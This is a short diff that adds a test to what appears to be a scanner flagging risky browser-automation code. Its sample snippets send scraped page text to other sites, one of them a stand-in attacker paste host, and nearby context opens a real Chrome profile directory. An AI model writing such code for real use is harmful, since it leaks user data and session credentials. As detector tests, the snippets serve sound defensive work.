@@ -145,3 +145,14 @@ def test_path_handed_to_a_helper_on_the_launch_line_is_not_a_launch_slot():
         "        ctx2 = p.chromium.launch_persistent_context(user_data_dir=os.path.expanduser("
         "'~/.config/google-chrome'))\n")
     assert bp.launch_only("tools/c.py", wrapped)
+
+
+def test_page_value_written_into_another_site_keeps_the_critical():
+    for tail, want in [
+        ('        page.goto("https://paste.attacker.example/new")\n'
+         '        page.fill("#b", text)\n', "critical"),
+        ('        page.goto("https://chat.example.cn/reply")\n'
+         '        page.fill("#b", text)\n', "high"),
+        ('        page.goto(target)\n        page.fill("#b", text)\n', "critical"),
+    ]:
+        assert _worst(_findings(_scrape(tail))) == want, tail
